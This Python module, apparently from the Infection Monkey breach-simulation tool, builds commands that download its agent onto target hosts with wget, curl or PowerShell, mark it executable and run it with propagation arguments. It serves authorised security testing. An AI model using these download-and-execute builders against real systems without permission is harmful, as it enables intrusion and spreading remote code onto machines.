from pathlib import PurePath
from typing import List, Optional, Sequence, Union

from monkeytypes import OTP, AgentID, OperatingSystem

from common.common_consts import AGENT_OTP_ENVIRONMENT_VARIABLE
from infection_monkey.exploit.tools.helpers import get_agent_dst_path, get_dropper_script_dst_path
from infection_monkey.i_puppet import TargetHost
from infection_monkey.model import CMD_CARRY_OUT, CMD_EXE, MONKEY_ARG


def build_agent_deploy_command(
    target_host: TargetHost, url: str, otp: OTP, args: Sequence[str]
) -> str:
    agent_dst_path = get_agent_dst_path(target_host)
    download_command = build_download_command(target_host, url, agent_dst_path)
    run_command = build_run_command(target_host, otp, agent_dst_path, args)

    return " ; ".join([download_command, run_command])


def build_dropper_script_deploy_command(target_host: TargetHost, url: str, otp: OTP) -> str:
    dropper_script_dst_path = get_dropper_script_dst_path(target_host)
    download_command = build_download_command(target_host, url, dropper_script_dst_path)
    run_command = build_run_command(target_host, otp, dropper_script_dst_path, [])

    return " ; ".join([download_command, run_command])


def build_agent_download_command(target_host: TargetHost, url: str) -> str:
    agent_dst_path = get_agent_dst_path(target_host)
    return build_download_command(target_host, url, agent_dst_path)


def build_dropper_script_download_command(target_host: TargetHost, url: str) -> str:
    dropper_script_dst_path = get_dropper_script_dst_path(target_host)
    return build_download_command(target_host, url, dropper_script_dst_path)


def build_download_command(target_host: TargetHost, url: str, dst: PurePath) -> str:
    if target_host.operating_system == OperatingSystem.WINDOWS:
        return build_download_command_windows_powershell_webrequest(url, dst)

    return build_download_command_linux_wget(url, dst)


def build_download_command_linux_wget(url: str, dst: PurePath) -> str:
    return f"wget -qO {dst} {url}; {set_permissions_command_linux(dst)}"


def build_download_command_linux_curl(url: str, dst: PurePath) -> str:
    return f"curl -so {dst} {url}; {set_permissions_command_linux(dst)}"


def build_download_command_windows_powershell_webclient(url: str, dst: PurePath) -> str:
    return f"(new-object System.Net.WebClient).DownloadFile(^''{url}^'' , ^''{dst}^'')"


def build_download_command_windows_powershell_webrequest(url: str, dst: PurePath) -> str:
    return f"Invoke-WebRequest -Uri '{url}' -OutFile '{dst}' -UseBasicParsing"


def set_permissions_command_linux(destination_path: PurePath) -> str:
    return f"chmod +x {destination_path}"


def build_run_command(target_host: TargetHost, otp: OTP, dst: PurePath, args: Sequence[str]) -> str:
    if target_host.operating_system == OperatingSystem.WINDOWS:
        return build_run_command_windows(otp, dst, args)

    return build_run_command_linux(otp, dst, args)


def build_run_command_linux(otp: OTP, destination_path: PurePath, args: Sequence[str]) -> str:
    return f"{AGENT_OTP_ENVIRONMENT_VARIABLE}={otp} {destination_path} {' '.join(args)}"


def build_run_command_windows(otp: OTP, destination_path: PurePath, args: Sequence[str]) -> str:
    return f"$env:{AGENT_OTP_ENVIRONMENT_VARIABLE}='{otp}' ; {destination_path} {' '.join(args)}"


def build_monkey_commandline(
    agent_id: AgentID, servers: List[str], depth: int, location: Union[str, PurePath, None] = None
) -> str:
    return " " + " ".join(
        build_monkey_commandline_parameters(
            agent_id,
            servers,
            depth,
            location,
        )
    )


def build_monkey_commandline_parameters(
    parent: Optional[AgentID] = None,
    servers: Optional[List[str]] = None,
    depth: Optional[int] = None,
    location: Union[str, PurePath, None] = None,
) -> List[str]:
    cmdline = []

    if parent is not None:
        cmdline.append("-p")
        cmdline.append(str(parent))
    if servers:
        cmdline.append("-s")
        cmdline.append(",".join(servers))
    if depth is not None:
        cmdline.append("-d")
        cmdline.append(str(depth))
    if location is not None:
        cmdline.append("-l")
        cmdline.append(str(location))

    return cmdline


def get_monkey_commandline_windows(destination_path: str, monkey_cmd_args: List[str]) -> List[str]:
    monkey_cmdline = [CMD_EXE, CMD_CARRY_OUT, destination_path, MONKEY_ARG]

    return monkey_cmdline + monkey_cmd_args


def get_monkey_commandline_linux(destination_path: str, monkey_cmd_args: List[str]) -> List[str]:
    monkey_cmdline = [destination_path, MONKEY_ARG]

    return monkey_cmdline + monkey_cmd_args
